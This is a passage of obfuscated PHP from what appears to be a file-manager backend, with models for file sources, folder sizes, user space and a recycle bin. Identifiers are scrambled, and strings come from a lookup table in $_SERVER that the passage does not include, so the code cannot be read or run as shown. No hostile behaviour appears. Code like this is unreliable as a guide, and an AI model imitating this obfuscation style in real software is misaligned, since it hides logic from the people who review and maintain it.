$ğªœ‹Öå[$æ™°‘Ì[183]]; if (isset(self::$cacheChildList[$šï°Ã÷ì])) { unset(self::$cacheChildList[$šï°Ã÷ì]); } return $Ö«‚Ø«; } public function setNamePinyin($ŒÒĞÓÎĞ, $©Ó° ¥Ş, $·µ¯ô›Ê = true) { $úé¬ØÖ¼ =& $_SERVER[º·Ï‹¥³]; $Ñ•Ëãç = Input::check($©Ó° ¥Ş, $úé¬ØÖ¼[639]); $œÔıªÄô = array($úé¬ØÖ¼[501] => KodSort::makeStr($©Ó° ¥Ş)); if ($Ñ•Ëãç) { $œÔıªÄô[$úé¬ØÖ¼[522]] = str_replace($úé¬ØÖ¼[53], $úé¬ØÖ¼[12], Pinyin::get($©Ó° ¥Ş)); $œÔıªÄô[$úé¬ØÖ¼[521]] = Pinyin::get($©Ó° ¥Ş, $úé¬ØÖ¼[640]); } if (!$·µ¯ô›Ê && !$Ñ•Ëãç) { $œÔıªÄô[$úé¬ØÖ¼[522]] = null; $œÔıªÄô[$úé¬ØÖ¼[521]] = null; } $this->metaSet($ŒÒĞÓÎĞ, $œÔıªÄô); } public function getContent($™•ô÷ËÖ) { $¼ÓÇƒã =& $_SERVER[º·Ï‹¥³]; $÷ïá‹Ë = $this->fileInfoGet($™•ô÷ËÖ); if (!$÷ïá‹Ë) { return !1; } if ($÷ïá‹Ë[$¼ÓÇƒã[79]] == 0) { return $¼ÓÇƒã[12]; } $«‰ôŸ¤¶ = $¼ÓÇƒã[2263] . $÷ïá‹Ë[$¼ÓÇƒã[531]]; if ($÷ïá‹Ë[$¼ÓÇƒã[79]] <= 1024 * 10) { $¶ş¹Ò•ù = Cache::get($«‰ôŸ¤¶); if (!$¶ş¹Ò•ù) { $¶ş¹Ò•ù = IO::getContent($÷ïá‹Ë[$¼ÓÇƒã[87]]); Cache::set($«‰ôŸ¤¶, $¶ş¹Ò•ù); } return $¶ş¹Ò•ù; } if (!$÷ïá‹Ë[$¼ÓÇƒã[87]]) { return $¼ÓÇƒã[12]; } return IO::getContent($÷ïá‹Ë[$¼ÓÇƒã[87]]); } public function setDesc($ú«ÈëÛ, $æŞ¹‰×Â) { $Ñ›”€ü€ =& $_SERVER[º·Ï‹¥³]; Model($Ñ›”€ü€[617])->eventAddDesc($ú«ÈëÛ, $æŞ¹‰×Â); return $this->metaSet($ú«ÈëÛ, $Ñ›”€ü€[510], $æŞ¹‰×Â); } public function setContent($¡ñáÇú, $İÖ¸¹Ë¶ = '') { $‘¢ûú­ =& $_SERVER[º·Ï‹¥³]; $ªøÂÖŞÀ = $this->sourceInfo($¡ñáÇú); $®Ø±˜ = $this->fileInfoGet($¡ñáÇú); if (!$®Ø±˜ || !$ªøÂÖŞÀ) { return !1; } $ÕÎŸ“¶ó = Model($‘¢ûú­[528])->addFileByContent($İÖ¸¹Ë¶, $ªøÂÖŞÀ[$‘¢ûú­[32]]); $¹Ú™­²ğ = $this->fileHistory($ªøÂÖŞÀ, $ÕÎŸ“¶ó[$‘¢ûú­[525]], $ÕÎŸ“¶ó[$‘¢ûú­[79]]); if (!$¹Ú™­²ğ) { return Model($‘¢ûú­[528])->remove($ÕÎŸ“¶ó[$‘¢ûú­[525]]); } $this->folderSizeReset($ªøÂÖŞÀ[$‘¢ûú­[183]]); return !0; } public function fileSubstr($ª‘ü–Õü, $ß”¬™¹Æ, $œÙÂÁ–) { $Øš±ğÆ = $this->fileInfoGet($ª‘ü–Õü); if (!$Øš±ğÆ) { return !1; } return IO::fileSubstr($Øš±ğÆ[$_SERVER[º·Ï‹¥³][87]], $ß”¬™¹Æ, $œÙÂÁ–); } public function fileInfoGet($–…ˆçáñ) { $ š°¢Å¦ =& $_SERVER[º·Ï‹¥³]; $½Éë„ãÀ = $this->sourceInfo($–…ˆçáñ); if (!$½Éë„ãÀ || $½Éë„ãÀ[$ š°¢Å¦[469]]) { return !1; } $æã÷î = $ š°¢Å¦[532] . $½Éë„ãÀ[$ š°¢Å¦[525]]; $¦´éï = _get(self::$cacheFileInfo, $æã÷î); if ($¦´éï) { return $¦´éï; } $—é›¥à” = Model($ š°¢Å¦[528])->fileInfo($½Éë„ãÀ[$ š°¢Å¦[525]]); if ($—é›¥à”) { $—é›¥à”[$ š°¢Å¦[32]] = $½Éë„ãÀ[$ š°¢Å¦[32]]; } self::$cacheFileInfo[$æã÷î] = $—é›¥à”; return $—é›¥à”; } private function folderChildrenNumber($ŒÔÌ¿èˆ) { $ùíûÌìÔ =& $_SERVER[º·Ï‹¥³]; $ìîçğ´ = $this->sourceInfo($ŒÔÌ¿èˆ); $ã²Î½Æ¢ = array($ùíûÌìÔ[636] => array($ùíûÌìÔ[596], $ìîçğ´[$ùíûÌìÔ[569]] . $ŒÔÌ¿èˆ . $ùíûÌìÔ[597]), $ùíûÌìÔ[633] => $ìîçğ´[$ùíûÌìÔ[554]], $ùíûÌìÔ[488] => intval($ìîçğ´[$ùíûÌìÔ[489]]), $ùíûÌìÔ[630] => 1); $‚“¯Õ = $this->where($ã²Î½Æ¢)->count(); $­éÂØ–ı = $this->where($ã²Î½Æ¢)->where(array($ùíûÌìÔ[630] => 0))->count(); return array($ùíûÌìÔ[83] => $­éÂØ–ı, $ùíûÌìÔ[84] => $‚“¯Õ); } public function pathInfo($¢Ã³¾¦, $ˆØå–Æ¢ = false) { $Œ‹¡Şõ =& $_SERVER[º·Ï‹¥³]; $ˆØå–Æ¢ = !1; $¢Ã³¾¦ = intval($¢Ã³¾¦); $ô¶é€Æ‘ = $Œ‹¡Şõ[518] . intval($ˆØå–Æ¢) . $Œ‹¡Şõ[446] . $¢Ã³¾¦; $æıùşÑ¶ = _get(self::$cachePathInfo, $ô¶é€Æ‘); if ($æıùşÑ¶) { return $æıùşÑ¶; } $°’½‡Ïõ = $this->sourceInfo($¢Ã³¾¦); if (!$°’½‡Ïõ) { return !1; } $°’½‡Ïõ = $this->_listDataApplyItem($°’½‡Ïõ, $ˆØå–Æ¢); self::$cachePathInfo[$ô¶é€Æ‘] = $°’½‡Ïõ; return $°’½‡Ïõ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ğŸÏÃØÄ) { $¸Ù£ó•ş =& $_SERVER[º·Ï‹¥³]; $¿ı’Ó‰Å = _get(self::$cachePathInfoMore, $ğŸÏÃØÄ); if ($¿ı’Ó‰Å) { return $¿ı’Ó‰Å; } $†éªâÑ = $this->pathInfo($ğŸÏÃØÄ); if (!$†éªâÑ) { return !1; } if ($†éªâÑ[$¸Ù£ó•ş[469]] == $¸Ù£ó•ş[91]) { $†éªâÑ[$¸Ù£ó•ş[82]] = $this->folderChildrenNumber($ğŸÏÃØÄ); } self::$cachePathInfoMore[$ğŸÏÃØÄ] = $†éªâÑ; return $†éªâÑ; } public function sourceInfo($ÑÏ¬Ÿ¯) { $ßî¨ãÊ‰ =& $_SERVER[º·Ï‹¥³]; if (!$ÑÏ¬Ÿ¯) { return array(); } $ÑÏ¬Ÿ¯ = intval($ÑÏ¬Ÿ¯); $„çƒØÆ± = $ßî¨ãÊ‰[517] . $ÑÏ¬Ÿ¯; $Ú“Ğ„ÑË = _get(self::$cacheSourceInfo, $„çƒØÆ±); if ($Ú“Ğ„ÑË) { return $Ú“Ğ„ÑË; } $ÂÖ°Ÿüó = $this->where(array($ßî¨ãÊ‰[184] => $ÑÏ¬Ÿ¯))->find(); self::$cacheSourceInfo[$„çƒØÆ±] = $ÂÖ°Ÿüó; return self::$cacheSourceInfo[$„çƒØÆ±]; } public function sourceCacheClear($¶ôïè» = false) { self::cacheClear($¶ôïè»); } public static function cacheClear($¶ŠòĞ‹¯ = false) { $˜”ºß· =& $_SERVER[º·Ï‹¥³]; if ($¶ŠòĞ‹¯ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$˜”ºß·[517] . $¶ŠòĞ‹¯]); unset(self::$cachePathInfoMore[$¶ŠòĞ‹¯]); unset(self::$cachePathInfo[$˜”ºß·[2264] . $¶ŠòĞ‹¯]); unset(self::$cachePathInfo[$˜”ºß·[2265] . $¶ŠòĞ‹¯]); } public function metaSet($±£²”êÎ, $ºŞ‡áƒû = null, $ÌÔÚ…Ûº = null) { $É¬É›Ÿ = parent::metaSet($±£²”êÎ, $ºŞ‡áƒû, $ÌÔÚ…Ûº); if ($É¬É›Ÿ) { $this->sourceCacheClear($±£²”êÎ); } return $É¬É›Ÿ; } public function pathInfoByPath($èèƒÓ¥, $ê–¿•Èã) { $•üŸ‘ê· =& $_SERVER[º·Ï‹¥³]; $¢ ŞÅãÖ = !$ê–¿•Èã ? array() : explode($•üŸ‘ê·[8], trim($ê–¿•Èã, $•üŸ‘ê·[8])); $ê€ë…ó¬ = $èèƒÓ¥; foreach ($¢ ŞÅãÖ as $şÃÁ¸á‹) { $¾Ï´¤Öô = array($•üŸ‘ê·[183] => $ê€ë…ó¬, $•üŸ‘ê·[32] => $şÃÁ¸á‹); $«¹À›ÒÅ = $this->field($•üŸ‘ê·[2266])->where($¾Ï´¤Öô)->select(); if (!$«¹À›ÒÅ) { return !1; } $«¹À›ÒÅ = array_sort_by($«¹À›ÒÅ, $•üŸ‘ê·[489]); $ê€ë…ó¬ = $«¹À›ÒÅ[0][$•üŸ‘ê·[184]]; } $¬‰òÙ±À = $this->sourceInfo($ê€ë…ó¬); $this->pathInfoFilter($¬‰òÙ±À); return $¬‰òÙ±À; } protected function updateModifyTime($¹Èüß ) { $¥ıÛ°°• =& $_SERVER[º·Ï‹¥³]; $‚¯ÓŒÅ‡ = defined($¥ıÛ°°•[2179]) ? USER_ID : 0; if (!$¹Èüß ) { return; } if (!is_array($¹Èüß )) { $¹Èüß  = array($¹Èüß ); } foreach ($¹Èüß  as $¢êáî… => $ŞÀõ¹Ÿ…) { $¹Èüß [$¢êáî…] = intval($ŞÀõ¹Ÿ…); $this->sourceCacheClear($ŞÀõ¹Ÿ…); } $èüÜ¶ŠÉ = array($¥ıÛ°°•[184] => array($¥ıÛ°°•[7], $¹Èüß )); $¤ê‘°¥ = array($¥ıÛ°°•[635] => $‚¯ÓŒÅ‡, $¥ıÛ°°•[482] => time()); $this->where($èüÜ¶ŠÉ)->save($¤ê‘°¥); } public function folderSizeReset($ïìšÙ¯, $ü©†ó˜ = false) { $Ù¤ÌîÉ» =& $_SERVER[º·Ï‹¥³]; if ($this->statusIgnoreResetSpace) { return; } $ç¦Õ®îØ = $this->sourceInfo($ïìšÙ¯); $‘İÜ³à­ = $Ù¤ÌîÉ»[2267] . $ïìšÙ¯; CacheLock::lock($‘İÜ³à­, 20); if ($ü©†ó˜ === !1) { $this->sourceCacheClear($ïìšÙ¯); $ç¦Õ®îØ = $this->sourceInfo($ïìšÙ¯); $Àó¾îóÜ = array($Ù¤ÌîÉ»[461] => $ïìšÙ¯, $Ù¤ÌîÉ»[488] => 0); $Ö±¢ĞÄã = $this->where($Àó¾îóÜ)->sum($Ù¤ÌîÉ»[79]); $ü©†ó˜ = intval($Ö±¢ĞÄã) - intval($ç¦Õ®îØ[$Ù¤ÌîÉ»[79]]); } if ($ü©†ó˜ == 0) { return CacheLock::unlock($‘İÜ³à­); } $×ÖÕé»ï = $this->parentLevelArray($ç¦Õ®îØ[$Ù¤ÌîÉ»[569]]); if (!$×ÖÕé»ï) { $×ÖÕé»ï = array(); } $×ÖÕé»ï[] = $ç¦Õ®îØ[$Ù¤ÌîÉ»[184]]; $Àó¾îóÜ = array($Ù¤ÌîÉ»[184] => array($Ù¤ÌîÉ»[476], $×ÖÕé»ï)); if ($ü©†ó˜ < 0) { $Àó¾îóÜ[$Ù¤ÌîÉ»[79]] = array($Ù¤ÌîÉ»[1064], abs($ü©†ó˜)); } $this->where($Àó¾îóÜ)->setAdd($Ù¤ÌîÉ»[79], $ü©†ó˜); CacheLock::unlock($‘İÜ³à­); $Ñ±¤ô£ = $Ù¤ÌîÉ»[2268] . $ç¦Õ®îØ[$Ù¤ÌîÉ»[181]] . $Ù¤ÌîÉ»[4] . $ç¦Õ®îØ[$Ù¤ÌîÉ»[554]]; $‘ôÚÖ¾­ = array($ç¦Õ®îØ[$Ù¤ÌîÉ»[181]], $ç¦Õ®îØ[$Ù¤ÌîÉ»[554]]); TaskRun::timeLimitCall($Ñ±¤ô£, $Ù¤ÌîÉ»[2269], $‘ôÚÖ¾­, 1.5); } public function folderSizeResetChildren($ğ¯³Ë°) { $ôè¤„„Á =& $_SERVER[º·Ï‹¥³]; $this->sourceCacheClear($ğ¯³Ë°); $ı¾Úá¶î = $this->sourceInfo($ğ¯³Ë°); $‰†·ƒ•Ü = array($ôè¤„„Á[630] => 1, $ôè¤„„Á[633] => $ı¾Úá¶î[$ôè¤„„Á[554]], $ôè¤„„Á[636] => array($ôè¤„„Á[596], $ı¾Úá¶î[$ôè¤„„Á[569]] . $ğ¯³Ë° . $ôè¤„„Á[597])); $Ú³Œ¢­ = $ôè¤„„Á[2270]; $¬ÆÂĞß‚ = $this->field($Ú³Œ¢­)->where($‰†·ƒ•Ü)->select(); $‰†·ƒ•Ü[$ôè¤„„Á[469]] = 0; $ÏÑ¯†ö = $this->field($Ú³Œ¢­)->where($‰†·ƒ•Ü)->select(); if (!$ÏÑ¯†ö) { return; } $¬ÆÂĞß‚[] = $ı¾Úá¶î; $¬ÆÂĞß‚ = array_to_keyvalue($¬ÆÂĞß‚, $ôè¤„„Á[184]); foreach ($¬ÆÂĞß‚ as $ºıíî¹Ş => $•‚ÎÆ÷ã) { $¬ÆÂĞß‚[$ºıíî¹Ş][$ôè¤„„Á[2271]] = $¬ÆÂĞß‚[$ºıíî¹Ş][$ôè¤„„Á[79]]; $¬ÆÂĞß‚[$ºıíî¹Ş][$ôè¤„„Á[79]] = 0; } foreach ($ÏÑ¯†ö as $•‚ÎÆ÷ã) { $êı¦ª±· = $•‚ÎÆ÷ã[$ôè¤„„Á[183]] . $ôè¤„„Á[12]; if (!isset($¬ÆÂĞß‚[$êı¦ª±·])) { continue; } if ($•‚ÎÆ÷ã[$ôè¤„„Á[489]] == $¬ÆÂĞß‚[$êı¦ª±·][$ôè¤„„Á[489]]) { $¬ÆÂĞß‚[$êı¦ª±·][$ôè¤„„Á[79]] += $•‚ÎÆ÷ã[$ôè¤„„Á[79]]; } } foreach ($¬ÆÂĞß‚ as $•‚ÎÆ÷ã) { $«Şò¹¥É = $this->parentLevelArray($•‚ÎÆ÷ã[$ôè¤„„Á[569]]); foreach ($«Şò¹¥É as $êı¦ª±·) { $êı¦ª±· = $êı¦ª±· . $ôè¤„„Á[12]; if (!isset($¬ÆÂĞß‚[$êı¦ª±·])) { continue; } if ($•‚ÎÆ÷ã[$ôè¤„„Á[489]] == $¬ÆÂĞß‚[$êı¦ª±·][$ôè¤„„Á[489]]) { $¬ÆÂĞß‚[$êı¦ª±·][$ôè¤„„Á[79]] += $•‚ÎÆ÷ã[$ôè¤„„Á[79]]; } } } $¦¿“ÑÏ© = array(); foreach ($¬ÆÂĞß‚ as $•‚ÎÆ÷ã) { if ($•‚ÎÆ÷ã[$ôè¤„„Á[79]] == $•‚ÎÆ÷ã[$ôè¤„„Á[2271]]) { continue; } $¦¿“ÑÏ©[] = array($ôè¤„„Á[184], $•‚ÎÆ÷ã[$ôè¤„„Á[184]], $ôè¤„„Á[79], $•‚ÎÆ÷ã[$ôè¤„„Á[79]]); } $this->saveAll($¦¿“ÑÏ©); } public function userSpaceReset($é»¦’ô² = false) { $–²şùÊã =& $_SERVER[º·Ï‹¥³]; $âÇù®º’ = $this->where(array($–²şùÊã[181] => self::TYPE_USER, $–²şùÊã[554] => $é»¦’ô², $–²şùÊã[469] => 0))->sum($–²şùÊã[79]); $âÇù®º’ = !$âÇù®º’ || $âÇù®º’ <= 0 ? 0 : $âÇù®º’; Model($–²şùÊã[562])->userEdit($é»¦’ô², array($–²şùÊã[1941] => $âÇù®º’)); } public function targetSpaceUpdate($ŒºÁ–‘˜, $ğÌüŞÇ) { $ûşëğÜü =& $_SERVER[º·Ï‹¥³]; if (!$ğÌüŞÇ) { return; } if (!in_array($ŒºÁ–‘˜, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ò§½•úŞ = $this->targetSpaceSize($ŒºÁ–‘˜, $ğÌüŞÇ); if ($ŒºÁ–‘˜ == self::TYPE_USER) { Model($ûşëğÜü[562])->userEdit($ğÌüŞÇ, array($ûşëğÜü[1941] => $Ò§½•úŞ)); } else { if ($ŒºÁ–‘˜ == self::TYPE_GROUP) { Model($ûşëğÜü[570])->groupEdit($ğÌüŞÇ, array($ûşëğÜü[1941] => $Ò§½•úŞ)); } } } public function targetSpaceSize($éõøÂÅ§, $…½ûà°) { $ëì³Ù‘¦ =& $_SERVER[º·Ï‹¥³]; $œËé’ªò = 0; $Ÿô´Ì‹œ = $this->targetSourceRoot($éõøÂÅ§, $…½ûà°, !0); foreach ($Ÿô´Ì‹œ as $¬¡ìéĞ´) { if (!$¬¡ìéĞ´) { continue; } $œËé’ªò += floatval($¬¡ìéĞ´[$ëì³Ù‘¦[79]]); $Ä€³ÉŒ = array($ëì³Ù‘¦[636] => array($ëì³Ù‘¦[596], $ëì³Ù‘¦[579] . $¬¡ìéĞ´[$ëì³Ù‘¦[184]] . $ëì³Ù‘¦[597])); $ÓÉâ¢Ã² = Model($ëì³Ù‘¦[487])->field($ëì³Ù‘¦[475])->where($Ä€³ÉŒ)->select(); $ÓÉâ¢Ã² = array_to_keyvalue($ÓÉâ¢Ã², $ëì³Ù‘¦[12], $ëì³Ù‘¦[184]); $ÓÉâ¢Ã² = array_unique(array_filter($ÓÉâ¢Ã²)); if ($ÓÉâ¢Ã²) { $Ä€³ÉŒ = array($ëì³Ù‘¦[475] => array($ëì³Ù‘¦[476], $ÓÉâ¢Ã²)); $œËé’ªò += floatval($this->where($Ä€³ÉŒ)->sum($ëì³Ù‘¦[79])); } } $œËé’ªò = !$œËé’ªò || $œËé’ªò <= 0 ? 0 : $œËé’ªò; return $œËé’ªò; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($õÄ“§Ùª) { return $this->fileTypeProfile($õÄ“§Ùª, SourceModel::TYPE_USER); } public function groupFileTypeProfile($…‹”ÈŠà) { return $this->fileTypeProfile($…‹”ÈŠà, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¤¿á¹, $‰¾¸äå) { $®©—î¹ø =& $_SERVER[º·Ï‹¥³]; $‰ìÓ€ú = $®©—î¹ø[2272] . $¤¿á¹ . $®©—î¹ø[11] . $‰¾¸äå; $œÙÇã° = Cache::get($‰ìÓ€ú); if ($œÙÇã°) { return $œÙÇã°; } $£öÕğÜÀ = array($®©—î¹ø[630] => 0); if ($¤¿á¹ != !1) { $£öÕğÜÀ[$®©—î¹ø[554]] = $¤¿á¹; $£öÕğÜÀ[$®©—î¹ø[181]] = $‰¾¸äå; } $Û‰³¼ € = array(); $Û‰³¼ €[$®©—î¹ø[2273]] = array($®©—î¹ø[2274] => LNG($®©—î¹ø[2273]), $®©—î¹ø[2275] => $this->where($£öÕğÜÀ)->count(), $®©—î¹ø[601] => $this->where($£öÕğÜÀ)->sum($®©—î¹ø[79])); $§•½Ìé = KodIO::fileTypeList(); foreach ($§•½Ìé as $àòÑØö => $±˜°®ÈÜ) { $£öÕğÜÀ[$®©—î¹ø[470]] = $this->fileTypeWhere($àòÑØö); $Û‰³¼ €[$àòÑØö] = array($®©—î¹ø[2274] => $±˜°®ÈÜ[$®©—î¹ø[32]], $®©—î¹ø[2275] => $this->where($£öÕğÜÀ)->count(), $®©—î¹ø[601] => $this->where($£öÕğÜÀ)->sum($®©—î¹ø[79])); } Cache::set($‰ìÓ€ú, $Û‰³¼ €, 1200); return $Û‰³¼ €; } public function fileNameExist($À³©ƒ·, $ª‹§äë) { $ªîÉü¦¸ =& $_SERVER[º·Ï‹¥³]; $¿¨­»©¹ = $this->field($ªîÉü¦¸[2276])->where(array($ªîÉü¦¸[183] => $À³©ƒ·, $ªîÉü¦¸[32] => $ª‹§äë, $ªîÉü¦¸[489] => 0))->find(); return is_array($¿¨­»©¹) ? $¿¨­»©¹[$ªîÉü¦¸[184]] : !1; } public function childList($ò¡Šõ‰Æ) { $ÙÔ™“ =& $_SERVER[º·Ï‹¥³]; $´•Ä˜…Ë = $ÙÔ™“[2247] . $ò¡Šõ‰Æ; if (isset(self::$cacheChildList[$´•Ä˜…Ë])) { return self::$cacheChildList[$´•Ä˜…Ë]; } $ğ™‘’• = array($ÙÔ™“[183] => intval($ò¡Šõ‰Æ), $ÙÔ™“[489] => 0); $¥©Ÿóó’ = $this->where($ğ™‘’•)->select(); $¥©Ÿóó’ = $¥©Ÿóó’ ? $¥©Ÿóó’ : array(); self::$cacheChildList[$´•Ä˜…Ë] = $¥©Ÿóó’; foreach ($¥©Ÿóó’ as $ÜÎ³¥ˆü) { $´•Ä˜…Ë = $ÙÔ™“[517] . $ÜÎ³¥ˆü[$ÙÔ™“[184]]; self::$cacheSourceInfo[$´•Ä˜…Ë] = $ÜÎ³¥ˆü; } return $¥©Ÿóó’; } public function fileNameAuto($ÎâúÈ¥û, $³ù¸¢Š¦, $’Á¯¿Àè = REPEAT_RENAME, $Ş¾»áü« = false) { $Ğ¢¿ñÈÓ =& $_SERVER[º·Ï‹¥³]; $œà°ïŞ = get_path_ext($³ù¸¢Š¦); $õŞÃ³Û = $œà°ïŞ ? get_path_ext_name($³ù¸¢Š¦) . $Ğ¢¿ñÈÓ[2277] . $œà°ïŞ : $³ù¸¢Š¦ . $Ğ¢¿ñÈÓ[444]; $³ãòá‹Ë = array($Ğ¢¿ñÈÓ[183] => $ÎâúÈ¥û, $Ğ¢¿ñÈÓ[489] => 0, $Ğ¢¿ñÈÓ[32] => array($Ğ¢¿ñÈÓ[443], $õŞÃ³Û)); $ùÖÜèß› = $this->field($Ğ¢¿ñÈÓ[32])->where($³ãòá‹Ë)->select(); $¼Ü¨×ö = array_to_keyvalue($ùÖÜèß›, $Ğ¢¿ñÈÓ[12], $Ğ¢¿ñÈÓ[32]); return $this->fileNameAutoGet($¼Ü¨×ö, $³ù¸¢Š¦, $’Á¯¿Àè, $Ş¾»áü«); } public function fileNameAutoGet($ÏŞÛƒşµ, $´¢ê°çõ, $¡û½û¬Õ, $á‘ŸøªŒ) { $È¥«ü÷ =& $_SERVER[º·Ï‹¥³]; if ($¡û½û¬Õ == REPEAT_REPLACE || !$ÏŞÛƒşµ || !in_array_not_case($´¢ê°çõ, $ÏŞÛƒşµ) || $á‘ŸøªŒ && $¡û½û¬Õ != REPEAT_RENAME_FOLDER) { return $´¢ê°çõ; } if ($¡û½û¬Õ == REPEAT_SKIP) { return !1; } $«êŸêÌô = $È¥«ü÷[10] . get_path_ext($´¢ê°çõ); $«êŸêÌô = $«êŸêÌô == $È¥«ü÷[10] || $á‘ŸøªŒ ? $È¥«ü÷[12] : $«êŸêÌô; for ($ÉĞƒÂ÷ = 1; $ÉĞƒÂ÷ <= count($ÏŞÛƒşµ) + 1; $ÉĞƒÂ÷++) { $ó²»ãÚ = substr($´¢ê°çõ, 0, strlen($´¢ê°çõ) - strlen($«êŸêÌô)); $ğöÌéÄÊ = $ó²»ãÚ . "\50{$ÉĞƒÂ÷}\51{$«êŸêÌô}"; if (!in_array_not_case($ğöÌéÄÊ, $ÏŞÛƒşµ)) { return $ğöÌéÄÊ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\x63\145\x5f\x72\x65\143\x79\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\124\x69\x6d\x65", "\x74\x69\x6d\145", "\x69\x6e\x73\x65\x72\x74", "\146\165\156\143\x74\151\157\x6e")); public function listData($ß”Í™” = false) { $¡¾º±Õ… =& $_SERVER[º·Ï‹¥³]; $ß”Í™” = $ß”Í™” ? $ß”Í™” : USER_ID; $×Ö¤Éé = $this->where(array($¡¾º±Õ…[1745] => $ß”Í™”))->select(); return array_to_keyvalue($×Ö¤Éé, $¡¾º±Õ…[12], $¡¾º±Õ…[184]); } public function moveToRecycle($Ä»²¹ÜŒ) { $‚ÑÍºÏ =& $_SERVER[º·Ï‹¥³]; $Šë¦¹ÉÔ = Model($‚ÑÍºÏ[1388]); $½’”óåŞ = $Šë¦¹ÉÔ->sourceInfo($Ä»²¹ÜŒ); if (!$½’”óåŞ || $½’”óåŞ[$‚ÑÍºÏ[489]] == $‚ÑÍºÏ[91]) { return; } $ƒüßŠ…ğ = array($‚ÑÍºÏ[475] => $Ä»²¹ÜŒ, $‚ÑÍºÏ[1745] => USER_ID, $‚ÑÍºÏ[632] => $½’”óåŞ[$‚ÑÍºÏ[181]], $‚ÑÍºÏ[633] => $½’”óåŞ[$‚ÑÍºÏ[554]], $‚ÑÍºÏ[636] => $½’”óåŞ[$‚ÑÍºÏ[569]]); $this->add($ƒüßŠ…ğ); $this->recycleMove($Ä»²¹ÜŒ, 1); if ($½’”óåŞ[$‚ÑÍºÏ[469]] == $‚ÑÍºÏ[91]) { $²‚™¡«ø = array($‚ÑÍºÏ[636] => array($‚ÑÍºÏ[596], $½’”óåŞ[$‚ÑÍºÏ[569]] . $Ä»²¹ÜŒ . $‚ÑÍºÏ[597])); $Šë¦¹ÉÔ->where($²‚™¡«ø)->setField($‚ÑÍºÏ[489], 1); } } public function clear() { $this->remove(!1); } public function remove($¸ØşïÔ” = false, $€²Ê£Ç² = false) { $«ºô‘ÔŸ =& $_SERVER[º·Ï‹¥³]; $€²Ê£Ç² = $€²Ê£Ç² ? $€²Ê£Ç² : USER_ID; $ü™É¸÷½ = Model($«ºô‘ÔŸ[1388]); $ÃŞÃ•Ğ¡ = $this->listData($€²Ê£Ç²); $¸ØşïÔ” = $¸ØşïÔ” === !1 ? !1 : $¸ØşïÔ”; $Ë™Ë×£å = array(); foreach ($ÃŞÃ•Ğ¡ as $ÂªóÊ¸û) { if ($¸ØşïÔ” != !1 && !in_array($ÂªóÊ¸û, $¸ØşïÔ”)) { continue; } $µÊÛÈşˆ = $ü™É¸÷½->sourceInfo($ÂªóÊ¸û); $ü™É¸÷½->remove($ÂªóÊ¸û, !1); $â¬œªºÈ = $µÊÛÈşˆ[$«ºô‘ÔŸ[181]] . $«ºô‘ÔŸ[11] . $µÊÛÈşˆ[$«ºô‘ÔŸ[554]]; $Ë™Ë×£å[$â¬œªºÈ] = array($«ºô‘ÔŸ[632] => $µÊÛÈşˆ[$«ºô‘ÔŸ[181]], $«ºô‘ÔŸ[554] => $µÊÛÈşˆ[$«ºô‘ÔŸ[554]]); $this->where(array($«ºô‘ÔŸ[184] => $ÂªóÊ¸û))->delete(); } foreach ($Ë™Ë×£å as $ÔÔ´ñ‹) { $ü™É¸÷½->targetSpaceUpdate($ÔÔ´ñ‹[$«ºô‘ÔŸ[181]], $ÔÔ´ñ‹[$«ºô‘ÔŸ[554]]); } } public function restore($ïìº§˜¸ = false) { $¾–Ë¸â = $this->listData(); $this->_restoreSource($¾–Ë¸â, $ïìº§˜¸); } public function removeUserAll($ÑóœéÑ“) { $this->remove(!1, $ÑóœéÑ“); } public function restoreItem($Ûá®Û‘‚) { $this->_restoreSource(array($Ûá®Û‘‚), array($Ûá®Û‘‚)); } private function _restoreSource($›Ã¡¤ìÂ, $¿îıÊ¢) { $‚ùâÆ’ =& $_SERVER[º·Ï‹¥³]; $ªÍéÎí‚ = Model($‚ùâÆ’[1388]); $¿îıÊ¢ = $¿îıÊ¢ == !1 ? !1 : $¿îıÊ¢; if (!$›Ã¡¤ìÂ) { return !0; } $Ï¸‚¢¨á = array(); foreach ($›Ã¡¤ìÂ as $òµ¼Èê›) { if ($¿îıÊ¢ != !1 && !in_array($òµ¼Èê›, $¿îıÊ¢)) { continue; } $ÊÂÈ•å› = $ªÍéÎí‚->sourceInfo($òµ¼Èê›); $Ş¢†©ø› = $ªÍéÎí‚->sourceInfo($ÊÂÈ•å›[$‚ùâÆ’[183]]); if ($Ş¢†©ø›[$‚ùâÆ’[489]] == $‚ùâÆ’[91]) { continue; } $ªÍéÎí‚->lockMoveStart($òµ¼Èê›); $this->recycleMove($òµ¼Èê›, 0); if ($ÊÂÈ•å›[$‚ùâÆ’[469]] == $‚ùâÆ’[91]) { $š˜ŒÛî = array($‚ùâÆ’[636] => array($‚ùâÆ’[596], $ÊÂÈ•å›[$‚ùâÆ’[569]] . $òµ¼Èê› . $‚ùâÆ’[597])); $ªÍéÎí‚->where($š˜ŒÛî)->setField($‚ùâÆ’[489], 0); $this->restoreFolderChildren($òµ¼Èê›, $›Ã¡¤ìÂ); } $this->where(array($‚ùâÆ’[184] => $òµ¼Èê›))->delete(); $ªÍéÎí‚->folderSizeReset($ÊÂÈ•å›[$‚ùâÆ’[183]]); $Ï¸‚¢¨á[] = $ÊÂÈ•å›[$‚ùâÆ’[183]]; if ($ÊÂÈ•å›[$‚ùâÆ’[469]] == $‚ùâÆ’[91]) { $Ï¸‚¢¨á[] = $òµ¼Èê›; } $ªÍéÎí‚->lockMoveEnd($òµ¼Èê›); } $ªÍéÎí‚->updateModifyTime($Ï¸‚¢¨á); } private function restoreFolderChildren($Û–©ı‘Í, $‡ğæŒ•) { $¤íš†ìò =& $_SERVER[º·Ï‹¥³]; $î£¸» = Model($¤íš†ìò[1388]); $ãœ•Â¦ó = array($¤íš†ìò[184] => array($¤íš†ìò[7], array())); foreach ($‡ğæŒ• as $÷ìÓ½†ó) { if ($÷ìÓ½†ó == $Û–©ı‘Í) { continue; } if (!$î£¸»->isParentOf($Û–©ı‘Í, $÷ìÓ½†ó)) { continue; } $õıö¤×½ = 